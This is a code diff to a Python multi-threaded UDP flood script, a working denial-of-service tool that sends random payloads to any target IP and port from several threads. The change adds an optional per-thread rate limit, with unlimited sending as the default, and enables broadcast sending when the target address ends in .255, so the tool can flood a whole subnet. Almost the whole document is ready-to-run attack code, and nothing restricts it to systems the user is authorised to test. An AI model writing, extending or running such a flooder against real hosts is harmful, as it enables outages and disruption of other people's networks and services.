@@ -7,30 +7,51 @@ import threading
 packet_count = 0
 packet_lock = threading.Lock()
 
-def attack_worker(target_ip, target_port, duration, packet_size, stop_event):
+def attack_worker(target_ip, target_port, duration, packet_size, stop_event, packets_per_sec=None):
     global packet_count
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    # Enable broadcast if target IP is a broadcast address
+    if target_ip.endswith(".255"):
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+        
     payload = random.randbytes(packet_size)
+    
+    # Calculate delay between packets for rate limiting
+    delay = 1.0 / packets_per_sec if packets_per_sec else 0
+    last_send_time = time.time()
     
     while not stop_event.is_set():
         try:
+            if delay > 0:
+                # Rate limiting: ensure minimum time between packets
+                current_time = time.time()
+                elapsed = current_time - last_send_time
+                if elapsed < delay:
+                    time.sleep(delay - elapsed)
+                last_send_time = time.time()
+            
             sock.sendto(payload, (target_ip, target_port))
             with packet_lock:
                 packet_count += 1
         except:
             break
 
-def run_test(target_ip, target_port, duration, packet_size, threads_count):
+def run_test(target_ip, target_port, duration, packet_size, threads_count, packets_per_sec=None):
     global packet_count
     print(f"Starting Multi-threaded UDP Flood...")
-    print(f"Target: {target_ip}:{target_port} | Threads: {threads_count} | Duration: {duration}s\n")
+    print(f"Target: {target_ip}:{target_port} | Threads: {threads_count} | Duration: {duration}s")
+    if packets_per_sec:
+        print(f"Rate limit: {packets_per_sec} packets/sec per thread\n")
+    else:
+        print(f"Rate limit: unlimited\n")
     
     packet_count = 0
     stop_event = threading.Event()
     threads = []
     
     for _ in range(threads_count):
-        t = threading.Thread(target=attack_worker, args=(target_ip, target_port, duration, packet_size, stop_event))
+        t = threading.Thread(target=attack_worker, args=(target_ip, target_port, duration, packet_size, stop_event, packets_per_sec))
         t.start()
         threads.append(t)
     
@@ -75,6 +96,7 @@ if __name__ == "__main__":
     parser.add_argument("--duration", type=int, default=15, help="Duration (sec)")
     parser.add_argument("--size", type=int, default=1024, help="Packet size")
     parser.add_argument("--threads", type=int, default=4, help="Number of threads")
+    parser.add_argument("--rate", type=int, default=None, help="Rate limit: packets per second per thread (default: unlimited)")
     
     args = parser.parse_args()
-    run_test(args.target, args.port, args.duration, args.size, args.threads)
+    run_test(args.target, args.port, args.duration, args.size, args.threads, args.rate)
